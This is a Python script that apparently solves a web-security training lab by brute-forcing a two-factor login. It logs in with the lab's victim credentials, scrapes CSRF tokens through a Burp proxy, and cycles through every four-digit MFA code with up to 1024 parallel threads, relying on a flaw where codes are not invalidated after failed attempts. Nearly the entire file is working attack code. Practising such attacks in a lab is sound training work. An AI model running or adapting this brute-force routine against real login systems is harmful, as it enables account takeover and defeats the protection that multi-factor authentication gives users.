import os

import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

import requests
from requests_html import HTMLSession

'''
Performs a series of different requests

 1) get login; grab csrf
 2) post login, with uid,pw,csrf
 3) get login2; grab csrf
 4) post login2, with code & csrf

objservations:
 # every get to login creates a new session & csrf
 # underlying issue: a new mfa token isn't generated after a new login (or rather, the token isn't discarded after too many failed attempts)
'''


# setup the variables for requests to go through burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
os.environ['REQUESTS_CA_BUNDLE'] = 'burp_cert.pem'
os.environ['HTTP_PROXY'] = "http://127.0.0.1:8080"
os.environ['HTTPS_PROXY'] = "http://127.0.0.1:8080"

lab_url_prefix = "ac741fbb1e8b28e480fc12bc00690016"

FOUND_EXIT_STATUS = 0
LAB_SOLVED = False

def get_login_1() -> tuple:

  burp0_url = "https://"+lab_url_prefix+".web-security-academy.net:443/login"
  burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                  "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://"+lab_url_prefix+".web-security-academy.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
  
  session = HTMLSession()

  get_login_response = session.get(burp0_url, headers=burp0_headers)
  response_session_cookie = get_login_response.cookies.get('session')

  response_html = get_login_response.html

  csrf_element = response_html.find("[name=csrf]", first=True)
  csrf_attribute_value = csrf_element.attrs.get('value')

  return csrf_attribute_value, response_session_cookie


def post_login_1(csrf_token, session) -> str: 
  burp0_url = "https://"+lab_url_prefix+".web-security-academy.net:443/login"
  burp0_cookies = {"session": session}
  burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://"+lab_url_prefix+".web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
                  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://"+lab_url_prefix+".web-security-academy.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
  burp0_data = {"csrf": csrf_token,
                "username": "carlos", "password": "montoya"}
  post_login_response = requests.post(
      burp0_url, allow_redirects=False, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
  return post_login_response.cookies.get('session')


def get_login_2(session) -> tuple:

  burp0_url = "https://"+lab_url_prefix+".web-security-academy.net:443/login2"
  burp0_cookies = {"session": session}
  burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close", "Cache-Control": "max-age=0",
                  "Upgrade-Insecure-Requests": "1", "Origin": "https://"+lab_url_prefix+".web-security-academy.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://"+lab_url_prefix+".web-security-academy.net/login", "Accept-Language": "en-US,en;q=0.9"}

  
  session = HTMLSession()

  get_login_response = session.get(
      burp0_url, headers=burp0_headers, cookies=burp0_cookies)
  response_session_cookie = get_login_response.cookies.get('session')

  response_html = get_login_response.html

  csrf_element = response_html.find("[name=csrf]", first=True)
  csrf_attribute_value = csrf_element.attrs.get('value')

  return csrf_attribute_value, response_session_cookie


def post_login_2(csrf_token, session, mfa_code) -> str:
  global LAB_SOLVED
  burp0_url = "https://"+lab_url_prefix+".web-security-academy.net:443/login2"
  burp0_cookies = {"session": session}
  burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://"+lab_url_prefix+".web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://"+lab_url_prefix+".web-security-academy.net/login2", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
  burp0_data = {"csrf": csrf_token, "mfa-code": mfa_code}

  session = HTMLSession()

  post_login_response = session.post(
      burp0_url, allow_redirects=False, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

  if post_login_response.status_code in range(300,400):
    print(f"Found matching response code for code: {mfa_code}, session: {session} and csrf: {csrf_token}")   
    if post_login_response.headers.get('Location') is not None:
      LAB_SOLVED = True
      print(f"Found matching response for code: {mfa_code}, session: {session} and csrf: {csrf_token}")
      os._exit(FOUND_EXIT_STATUS)

  response_html = post_login_response.html
  
  lab_solved_element = response_html.find("[id=notification-labsolved]", first=True)
  if lab_solved_element:
    LAB_SOLVED = True
    print("Already found matching response")
    os._exit(FOUND_EXIT_STATUS)

  #print(f"response {post_login_response.status_code} for code {mfa_code}")
  return post_login_response.cookies.get('session')


def all_steps(mfa_code: int):
  global LAB_SOLVED
  if not LAB_SOLVED:
    # always completes the full cycle, regardless of whether or not we get bumped    
    csrf_value, session = get_login_1()
    session = post_login_1(csrf_token=csrf_value, session=session)
    # inner loop
    csrf_value, new_session = get_login_2(session=session)
    if new_session:
      session = new_session
      # fix-me - some logic here about going back to stage 1...
    session = post_login_2(csrf_token=csrf_value,
                          session=session, mfa_code=f"{mfa_code:04}")                         


def main():
  all_steps(1111)
  #threaded_all_steps_main()


def threaded_all_steps_main():
  found_match = False
  with ThreadPoolExecutor(max_workers=1024) as executor:
    returned_futures = []
    for le_brut in range(000, 10001):
      returned_future = executor.submit(all_steps, mfa_code=le_brut)
      returned_futures.append(returned_future)
    for future in concurrent.futures.as_completed(returned_futures):
      if future.result():
        found_match = True
        print("found the matching code")
        break

  if not found_match:
    print("didn't find the desired response")


main()
